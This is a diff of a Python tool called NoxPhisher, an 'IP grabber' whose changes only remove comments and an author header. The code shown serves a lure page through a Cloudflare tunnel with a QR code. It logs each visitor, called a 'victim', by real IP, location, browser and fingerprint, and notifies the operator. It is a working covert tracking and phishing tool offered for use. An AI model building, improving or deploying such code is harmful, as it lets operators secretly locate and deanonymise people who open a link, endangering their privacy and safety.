@@ -1,6 +1,3 @@
-# noxphisher.py — by nostraxiten
-# github.com/nostraxiten
-
 import os
 import sys
 import time
@@ -15,10 +12,6 @@ import datetime
 import re
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-# ──────────────────────────────────────────────
-#  CORE
-# ──────────────────────────────────────────────
-
 class IPGrabberUltimate:
     def __init__(self, port=8080, dedup_window=60):
         self.port = port
@@ -30,8 +23,6 @@ class IPGrabberUltimate:
         self.start_time = time.time()
         self.db_path = "captures.db"
         self.init_db()
-
-    # ── Base de datos ──────────────────────────
 
     def init_db(self):
         conn = sqlite3.connect(self.db_path)
@@ -109,8 +100,6 @@ class IPGrabberUltimate:
         conn.close()
         return total, unique
 
-    # ── Deduplicación ──────────────────────────
-
     def is_duplicate(self, ip, fingerprint):
         with self.lock:
             now = time.time()
@@ -137,8 +126,6 @@ class IPGrabberUltimate:
             ]
             for key in keys_to_delete:
                 del self.seen_ips[key]
-
-    # ── Red ────────────────────────────────────
 
     def get_public_ip(self):
         try:
@@ -181,8 +168,6 @@ class IPGrabberUltimate:
             return 'IPv6' if ':' in ip else 'IPv4'
         except:
             return 'Unknown'
-
-    # ── Página web ─────────────────────────────
 
     def create_web(self):
         os.makedirs("grabber_web", exist_ok=True)
@@ -299,11 +284,6 @@ class IPGrabberUltimate:
         with open(os.path.join("grabber_web", "index.html"), "w") as f:
             f.write(html)
 
-
-# ──────────────────────────────────────────────
-#  HTTP HANDLER
-# ──────────────────────────────────────────────
-
 class GrabberHandler(BaseHTTPRequestHandler):
     def log_message(self, *args): pass
 
@@ -350,7 +330,6 @@ class GrabberHandler(BaseHTTPRequestHandler):
             except Exception:
                 data = {}
 
-            # IP real — prioridad: CF-Connecting-IP → X-Forwarded-For → client_address
             cf_ip = self.headers.get('CF-Connecting-IP')
             if cf_ip:
                 ip_public = cf_ip.strip()
@@ -406,7 +385,6 @@ class GrabberHandler(BaseHTTPRequestHandler):
             self.server.grabber.victims.append(victim_data)
             self.server.grabber.save_to_db(victim_data)
 
-            # Notificación Termux (silenciosa si no está disponible)
             try:
                 subprocess.run([
                     'termux-notification',
@@ -458,11 +436,6 @@ class GrabberHandler(BaseHTTPRequestHandler):
         if 'opera' in u:    return 'Opera'
         return 'Unknown'
 
-
-# ──────────────────────────────────────────────
-#  TUNNEL
-# ──────────────────────────────────────────────
-
 def parse_tunnel_url(line):
     m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
     return m.group(0) if m else None
@@ -485,11 +458,6 @@ def start_cloudflare_tunnel(port=8080):
         return None, None
     except Exception:
         return None, None
-
-
-# ──────────────────────────────────────────────
-#  QR
-# ──────────────────────────────────────────────
 
 def generate_qr_terminal(url):
     print("\033[92m[*] Generando QR...\033[0m")
@@ -520,11 +488,6 @@ def generate_qr_terminal(url):
 
     print(f"\033[93m[+] URL: {url}\033[0m")
 
-
-# ──────────────────────────────────────────────
-#  VIEW
-# ──────────────────────────────────────────────
-
 def view_captures(limit=50):
     grabber = IPGrabberUltimate()
     rows    = grabber.get_captures(limit)
@@ -538,11 +501,6 @@ def view_captures(limit=50):
     for row in rows:
         print(f"#{row['capture_id']} | {row['datetime']} | {row['ip_public']} ({row['ip_version']}) | {row['city']}, {row['country']} | {row['browser']}")
     print("=" * 70)
-
-
-# ──────────────────────────────────────────────
-#  SHUTDOWN
-# ──────────────────────────────────────────────
 
 def shutdown(grabber, proc, server):
     total, unique = grabber.get_stats()
@@ -561,11 +519,6 @@ def shutdown(grabber, proc, server):
         proc.terminate()
     server.shutdown()
     sys.exit(0)
-
-
-# ──────────────────────────────────────────────
-#  MAIN
-# ──────────────────────────────────────────────
 
 def main():
     parser = argparse.ArgumentParser(description="NoxPhisher — by nostraxiten")
